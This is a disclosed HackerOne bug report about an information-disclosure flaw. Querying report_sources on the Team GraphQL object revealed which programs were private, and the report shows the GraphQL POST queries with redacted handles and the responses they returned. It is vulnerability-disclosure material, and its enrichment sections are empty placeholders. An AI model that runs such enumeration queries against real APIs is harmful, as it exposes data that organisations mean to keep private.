---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '770209'
original_report_id: '770209'
title: Unauthorized user can obtain `report_sources` attribute through Team GraphQL
  object
weakness: Information Disclosure
team_handle: security
created_at: '2020-01-08T12:10:48.071Z'
disclosed_at: '2020-02-10T21:48:48.814Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 137
asset_identifier: hackerone.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# Unauthorized user can obtain `report_sources` attribute through Team GraphQL object

## Metadata

- HackerOne Report ID: 770209
- Weakness: Information Disclosure
- Program: security
- Disclosed At: 2020-02-10T21:48:48.814Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
Hi team. And Happy New Year!
**Description:**
If I am not mistaken, then through this parameter we can define private programs with an external link.

If this parameter is not empty, then the program is private. - `["HackerOne Platform"]`
### Steps To Reproduce

https://hackerone.com/graphql
POST:


1){"query": "query {team(handle:\\"████████\\"){_id,report_sources}}"}
`{"data":{"team":{"_id":"██████████","report_sources":[]}}}` - not private program

2){"query": "query {team(handle:\\"███\\"){_id,report_sources}}"}
`{"data":{"team":{"_id":"█████","report_sources":["HackerOne Platform"]}}}` - `["HackerOne Platform"]` - private program

3){"query": "query {team(handle:\\"█████████\\"){_id,report_sources}}"}
`{"data":{"team":{"_id":"█████████","report_sources":["HackerOne Platform"]}}}` - `["HackerOne Platform"]` - private program

4){"query": "query {team(handle:\\"█████\\"){_id,report_sources}}"}
`{"data":{"team":{"_id":"███","report_sources":[]}}}` - not private program

Sorry i bad speak english
I hope you understand me
Thank you,haxta4ok00

## Impact

disclosed of private programs who have external link

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
